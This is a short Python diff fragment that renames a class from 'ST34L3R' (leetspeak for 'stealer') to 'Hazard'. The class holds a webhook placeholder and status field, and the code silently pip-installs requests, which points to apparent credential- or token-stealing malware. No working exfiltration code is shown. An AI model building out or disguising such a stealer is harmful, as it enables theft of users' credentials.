@@ -6,7 +6,7 @@ for _ in range(2):
         os.system('pip install requests >nul')
 
 import os, re, requests, json
-class ST34L3R():
+class Hazard():
     def __init__(self, hook, status):
         self.webhook = "WEBHOOK_HERE"
         self.NEW_STATUS = status
